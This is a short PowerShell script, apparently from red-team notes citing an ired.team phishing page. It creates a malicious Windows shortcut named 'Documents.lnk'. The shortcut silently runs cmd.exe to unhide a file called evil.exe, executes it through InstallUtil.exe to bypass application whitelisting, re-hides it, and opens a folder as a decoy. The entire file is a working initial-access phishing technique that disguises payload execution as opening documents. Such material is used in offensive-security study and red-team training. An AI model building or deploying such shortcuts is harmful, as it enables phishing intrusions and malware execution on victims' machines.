# https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk

$obj = New-object -comobject wscript.shell
# output file
$link = $obj.createshortcut("c:\payloads\nobelium\Documents.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\cmd.exe"
# predefined lnk icon
#$link.iconlocation = "C:\windows\system32\notepad.exe"
# command to execute
$link.arguments = "/c attrib -h evil.exe  && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U evil.exe  && attrib +h evil.exe && start c:\"
$link.save()
